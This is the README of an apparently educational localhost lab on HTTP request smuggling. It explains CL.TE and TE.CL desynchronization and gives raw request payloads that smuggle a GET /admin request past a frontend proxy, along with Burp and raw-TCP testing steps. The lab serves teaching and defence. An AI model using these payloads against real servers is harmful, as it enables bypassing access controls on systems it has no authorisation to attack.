# HTTP Request Smuggling Educational Lab

> ⚠️ **WARNING**: This lab contains **intentionally vulnerable** HTTP servers.
> It is designed for **localhost educational use only**. Do NOT expose these
> services to a network. Do NOT use these techniques against systems you do
> not own.

## Table of Contents

1. [HTTP Request Framing](#part-1--http-request-framing)
2. [CL.TE Smuggling](#part-2--clte-smuggling)
3. [TE.CL Smuggling](#part-3--tecl-smuggling)
4. [Running the Lab](#part-4--running-the-lab)
5. [Testing with Burp Suite](#part-5--testing-with-burp-suite)
6. [Raw TCP Testing](#part-6--raw-tcp-testing)
7. [Reading the Logs](#part-7--reading-the-logs)

---

## Part 1 — HTTP Request Framing

HTTP/1.1 uses two mechanisms to determine where one request ends and the next begins on a persistent TCP connection:

### Content-Length

```
Content-Length: 13
```

The server reads exactly 13 bytes after the header terminator (`\r\n\r\n`) as the request body. Simple, explicit.

### Transfer-Encoding: chunked

```
Transfer-Encoding: chunked
```

The body is sent in chunks. Each chunk has a hex size prefix:

```
<chunk-size-in-hex>\r\n
<chunk-data>\r\n
...
0\r\n
\r\n
```

The body ends when a zero-length chunk (`0\r\n\r\n`) is received.

### The Problem

**RFC 7230 §3.3.3** says: if both `Content-Length` and `Transfer-Encoding` are present, `Transfer-Encoding` takes priority.

But what if the **frontend** proxy and the **backend** server disagree about which header to use?

If they disagree, they will disagree about **where the request body ends**. The bytes that one server considers "part of request A" might be seen by the other as "the beginning of request B."

**This is HTTP Request Smuggling.**

---

## Part 2 — CL.TE Smuggling

```
Frontend → Content-Length (CL)
Backend  → Transfer-Encoding (TE)
```

### How it works

1. The **frontend** reads `Content-Length` bytes as the body.
2. It forwards the entire request (headers + body) to the backend.
3. The **backend** reads using `Transfer-Encoding: chunked`.
4. The chunked body terminates early (at `0\r\n\r\n`).
5. **Remaining bytes** in the TCP stream are parsed as a **new request**.

### Byte-level example

```
POST / HTTP/1.1\r\n
Host: localhost:8080\r\n
Content-Length: 50\r\n          ← Frontend reads 50 bytes as body
Transfer-Encoding: chunked\r\n  ← Backend uses this instead
\r\n
0\r\n                            ← Backend: "chunked body is done!" (5 bytes)
\r\n
GET /admin HTTP/1.1\r\n          ← Backend: "This is a NEW request!"
Host: localhost:8080\r\n
\r\n
```

**Frontend sees**: 1 request (POST /) with a 50-byte body.

**Backend sees**: 2 requests:
1. POST / with empty chunked body
2. GET /admin — the **smuggled** request!

### Architecture

```
Client
  │
  │ HTTP/1.1
  ▼
CL.TE Frontend :8080      ← Uses Content-Length
  │
  │ persistent TCP
  ▼
CL.TE Backend              ← Uses Transfer-Encoding
```

---

## Part 3 — TE.CL Smuggling

```
Frontend → Transfer-Encoding (TE)
Backend  → Content-Length (CL)
```

### How it works

1. The **frontend** reads `Transfer-Encoding: chunked` and decodes the chunked body.
2. It forwards the decoded body (with original headers) to the backend.
3. The **backend** reads `Content-Length` bytes.
4. If `Content-Length` is smaller than the decoded body, the backend reads fewer bytes.
5. **Remaining bytes** become a **new request**.

### Byte-level example

Payload sent to frontend:

```
POST / HTTP/1.1\r\n
Host: localhost:8081\r\n
Content-Length: 4\r\n              ← Backend will read only 4 bytes
Transfer-Encoding: chunked\r\n    ← Frontend decodes chunks
\r\n
31\r\n                             ← Chunk: 0x31 = 49 bytes
xx\r\n                             ← 4 bytes (Content-Length covers these)
GET /admin HTTP/1.1\r\n            ← Smuggled request (remaining bytes)
Host: localhost:8081\r\n
\r\n
\r\n                               ← End of chunk
0\r\n                              ← Terminal chunk
\r\n
```

**Frontend sees**: 1 request with a chunked body.

**Backend sees**: 2 requests:
1. POST / with 4-byte body (`xx\r\n`)
2. GET /admin — the **smuggled** request!

### Architecture

```
Client
  │
  │ HTTP/1.1
  ▼
TE.CL Frontend :8081      ← Uses Transfer-Encoding
  │
  │ persistent TCP
  ▼
TE.CL Backend              ← Uses Content-Length
```

---

## Part 4 — Running the Lab

### Prerequisites

- Docker
- Docker Compose

### Start

```bash
docker compose up --build
```

### Endpoints

| Lab   | URL                        | Frontend Parser | Backend Parser |
|-------|----------------------------|-----------------|----------------|
| CL.TE | `http://127.0.0.1:8080`   | Content-Length   | Transfer-Encoding |
| TE.CL | `http://127.0.0.1:8081`   | Transfer-Encoding | Content-Length |

### Stop

```bash
docker compose down
```

### Backend Endpoints

Both backends support:

| Method | Path    | Response         |
|--------|---------|------------------|
| GET    | /       | Hello world!     |
| GET    | /hello  | Hello message    |
| GET    | /admin  | ADMIN AREA       |
| POST   | /       | POST received.   |
| POST   | /echo   | Echo: \<body\>   |

---

## Part 5 — Testing with Burp Suite

### CL.TE with Burp Repeater

1. Open Burp Suite → Repeater tab
2. Set target: `127.0.0.1:8080`
3. Paste the following raw request:

```
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost:8080

```

4. **Important**: In Burp, ensure:
   - `Update Content-Length` is **unchecked** (we need our exact value)
   - Connection is HTTP/1.1

5. Send the request
6. Check `docker compose logs cl-te-backend` — you should see **two** parsed requests.

### TE.CL with Burp Repeater

1. Set target: `127.0.0.1:8081`
2. Paste:

```
POST / HTTP/1.1
Host: localhost:8081
Content-Length: 4
Transfer-Encoding: chunked

31
xx
GET /admin HTTP/1.1
Host: localhost:8081


0

```

3. Send and check `docker compose logs te-cl-backend`

### curl (limited)

> **Note**: `curl` may normalize headers or alter `Content-Length`. For reliable
> testing, use Burp Repeater or the raw TCP client below.

Basic connectivity test:

```bash
curl http://127.0.0.1:8080/
curl http://127.0.0.1:8081/
```

---

## Part 6 — Raw TCP Testing

The included `tests/raw_client.py` sends exact bytes over TCP without any HTTP library normalization.

### Usage

```bash
# CL.TE test
python tests/raw_client.py --port 8080 --file examples/cl-te-request.txt

# TE.CL test
python tests/raw_client.py --port 8081 --file examples/te-cl-request.txt

# With hex dump
python tests/raw_client.py --port 8080 --file examples/cl-te-request.txt --hex
```

### Automated Tests

```bash
# Test CL.TE smuggling
python tests/test_cl_te.py

# Test TE.CL smuggling
python tests/test_te_cl.py
```

These tests verify that the backend processes **two requests** from a **single TCP connection** — confirming that request smuggling occurred.

---

## Part 7 — Reading the Logs

### Viewing logs

```bash
# All logs
docker compose logs -f

# CL.TE frontend only
docker compose logs -f cl-te-frontend

# CL.TE backend only
docker compose logs -f cl-te-backend

# TE.CL frontend only
docker compose logs -f te-cl-frontend

# TE.CL backend only
docker compose logs -f te-cl-backend
```

### What to look for

After sending a smuggling payload, compare the **frontend** and **backend** logs:

#### Frontend log (CL.TE example)

```
============================================================
FRONTEND REQUEST #1
============================================================

Parser mode: CL (Content-Length)

Request line:
  POST / HTTP/1.1

Content-Length:
  48

Transfer-Encoding (IGNORED by frontend):
  chunked

Frontend believes request body is:
  48 bytes

Forwarding 48 bytes to backend...
============================================================
```

The frontend sees **one request** with a 48-byte body.

#### Backend log (CL.TE example)

```
============================================================
BACKEND REQUEST #1
============================================================

Request line:
  POST / HTTP/1.1

Parser mode:
  TE (Transfer-Encoding: chunked)

Body length:
  0 bytes
============================================================

⚠ 43 bytes remaining in stream — will attempt to parse as next request!

============================================================
BACKEND REQUEST #2
============================================================

Request line:
  GET /admin HTTP/1.1

Parser mode:
  NONE (no body)
============================================================
```

The backend sees **two requests**! Request #2 is the **smuggled** request that the frontend never intended to send.

### Why the desynchronization happens

| | Frontend (CL) | Backend (TE) |
|---|---|---|
| **Reads body using** | Content-Length: 48 | Transfer-Encoding: chunked |
| **Body ends at** | After 48 bytes | After `0\r\n\r\n` (5 bytes) |
| **Sees** | 1 request | 2 requests |
| **Remaining bytes** | None | `GET /admin HTTP/1.1...` |

The 43 bytes that the backend didn't consume as part of request #1's body become **request #2** — which is the smuggled request the attacker injected.

---

## Project Structure

```
http-request-smuggling-lab/
│
├── README.md                    ← You are here
├── docker-compose.yml           ← Both environments
├── .gitignore
│
├── cl-te/                       ← CL.TE environment
│   ├── Dockerfile
│   ├── frontend.py              ← Uses Content-Length
│   ├── backend.py               ← Uses Transfer-Encoding
│   └── requirements.txt
│
├── te-cl/                       ← TE.CL environment
│   ├── Dockerfile
│   ├── frontend.py              ← Uses Transfer-Encoding
│   ├── backend.py               ← Uses Content-Length
│   └── requirements.txt
│
├── tests/
│   ├── raw_client.py            ← Raw TCP testing client
│   ├── test_cl_te.py            ← CL.TE automated test
│   └── test_te_cl.py            ← TE.CL automated test
│
└── examples/
    ├── cl-te-request.txt        ← CL.TE smuggling payload
    └── te-cl-request.txt        ← TE.CL smuggling payload
```

---

## Safety

- All ports are bound to `127.0.0.1` only
- Backend ports are not exposed to the host
- No external network targets are required
- No malware, credential theft, or persistence mechanisms
- This is for **local educational use only**
